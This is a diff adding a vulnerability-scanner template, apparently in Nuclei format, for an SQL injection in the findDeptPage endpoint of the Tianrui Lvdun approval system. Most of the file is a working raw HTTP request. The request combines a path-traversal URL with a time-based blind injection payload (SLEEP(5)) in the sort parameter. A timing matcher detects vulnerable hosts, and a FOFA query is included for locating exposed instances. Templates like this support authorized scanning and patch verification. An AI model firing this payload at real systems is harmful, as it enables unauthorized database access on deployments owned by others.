@@ -1,0 +1,37 @@
+id: poc-fv74nhbxfg3lqwfr
+info:
+  name: 天锐绿盾审批系统findDeptPage存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fv74nhbxfg3lqwfr
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fv74nhbxfg3lqwfr
+    fofa: app="TIPPAY-绿盾审批系统"
+http:
+- raw:
+  - 'POST /trwfe/service/.%2E/dept/findDeptPage.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: python-requests/<version>
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Accept: */*
+
+    Connection: keep-alive
+
+
+    sort=(SELECT 2005 FROM (SELECT(SLEEP(5)))IEWh)'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
